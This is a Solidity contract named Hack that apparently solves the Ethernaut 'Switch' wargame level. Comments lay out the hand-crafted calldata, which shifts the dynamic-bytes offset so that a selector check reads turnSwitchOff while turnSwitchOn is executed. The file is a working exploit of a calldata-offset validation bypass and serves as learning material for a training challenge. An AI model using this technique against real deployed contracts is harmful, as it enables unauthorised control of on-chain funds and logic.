// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
    constructor(address _target) {
        bytes
            memory callData = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
        (bool ok, ) = address(_target).call(callData);
        require(ok, "call fail");
    }
}

// Calldata layout ->
// 30c13ade -> function selector for flipSwitch(bytes memory data)
// 0000000000000000000000000000000000000000000000000000000000000060 -> offset for the data field
// 0000000000000000000000000000000000000000000000000000000000000000 -> empty stuff so we can have bytes4(keccak256("turnSwitchOff()")) at 64 bytes
// 20606e1500000000000000000000000000000000000000000000000000000000 -> bytes4(keccak256("turnSwitchOff()"))
// 0000000000000000000000000000000000000000000000000000000000000004 -> length of data field
// 76227e1200000000000000000000000000000000000000000000000000000000 -> functin selector for turnSwitchOn()

// solution: https://medium.com/@lu_ka_ra_ch_ki/ethernaut-level-29-switch-12e22210d394
// calldata layout: https://docs.soliditylang.org/en/v0.8.19/abi-spec.html#abi
